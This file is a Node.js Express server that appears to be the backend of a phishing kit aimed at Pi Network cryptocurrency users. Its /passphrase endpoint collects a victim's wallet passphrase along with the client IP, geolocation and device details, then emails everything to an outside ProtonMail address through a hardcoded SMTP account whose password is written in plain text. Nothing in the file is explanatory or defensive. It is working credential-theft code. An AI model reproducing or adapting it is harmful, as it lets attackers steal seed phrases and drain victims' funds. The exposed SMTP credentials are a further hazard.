const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const axios = require('axios');
const cors = require('cors');

const UAParser = require('ua-parser-js'); // Import ua-parser-js module

const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors());

app.post('/passphrase', async (req, res) => {

  const clientIP = req.ip;
  const userAgent = req.headers['user-agent'];
  //
 
  //const url = `https://freeipapi.com/api/json/${clientIP}`; // to get specific ip's info
const url = `https://freeipapi.com/api/json`; // to get current request's ip info


 


  

  // Parse user-agent header to get device information using ua-parser-js
  const parser = new UAParser();
  const deviceInfo = parser.setUA(userAgent).getResult();
  //console.log(deviceInfo)

  if (!req.body.hasOwnProperty('passphrase')) {
    return res.status(400).json({ error: 'Passphrase key is missing in the request body' });
  }

  const passphrase = req.body.passphrase;

  let transporter = nodemailer.createTransport({
    host: "160-20-145-243.cprapid.com",
    port: 465,
    secure: true,
    auth: {
      user: "admin@pimainetexchange.com",
      pass: "Piesender10",
    },
    tls: {
      rejectUnauthorized: false
    }
  });

   const response = await axios.get(url)
   const data =  response.data
   const {countryName, 
          cityName, 
          regionName, 
          isProxy,   
          continent, 
          timeZone} = data

   
  
  const mailOptions = {
    from: 'admin@pimainetexchange.com',
    to: 'pinetwork101@proton.me',
    subject: `${clientIP}: Passphrase Received`,
    text: `
              \nPassphrase: ${passphrase}\n
              \nIP Location: ${clientIP}
              \nContinent: ${continent},
                \nCountry: ${countryName},
                \nRegion:${regionName}, 
                \nCity:${cityName},
                \nTimezone:${timeZone},
                \nVpn:${isProxy?"Yes":"No"}\n
              
              \nDevice Info: ${JSON.stringify(deviceInfo)}\n`,
  };

  

  try {
    await transporter.sendMail(mailOptions);
    res.json({ message: 'Passphrase received successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to send email' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});
